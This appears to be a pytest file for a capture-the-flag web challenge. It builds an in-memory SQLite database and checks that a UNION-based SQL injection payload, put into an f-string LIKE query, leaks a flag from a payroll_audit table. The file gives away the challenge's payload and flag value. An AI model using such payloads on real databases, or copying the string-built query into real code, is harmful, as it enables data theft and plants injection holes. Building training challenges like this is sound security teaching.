import sqlite3
from pathlib import Path


def test_challenge_04_solvable():
    app_file = Path(__file__).parent.parent / "app" / "app.py"
    assert app_file.exists(), "Web app script missing"

    # Verify SQL query logic and vulnerability in database
    conn = sqlite3.connect(":memory:")
    cur = conn.cursor()
    cur.execute("CREATE TABLE employees (id INTEGER PRIMARY KEY, name TEXT, department TEXT, email TEXT)")
    cur.execute("CREATE TABLE payroll_audit (id INTEGER PRIMARY KEY, employee_id INT, notes TEXT, flag TEXT)")
    cur.execute("INSERT INTO payroll_audit VALUES (1, 4, 'Executive bonus', 'FLAG{sqli_union_payroll_leak_pwned}')")

    query = "' UNION SELECT id, employee_id, notes, flag FROM payroll_audit --"
    sql = f"SELECT id, name, department, email FROM employees WHERE name LIKE '%{query}%'"
    cur.execute(sql)
    rows = cur.fetchall()

    flags = [r[3] for r in rows if "FLAG{sqli_union_payroll_leak_pwned}" in str(r)]
    assert len(flags) > 0, "SQL injection failed to retrieve flag"
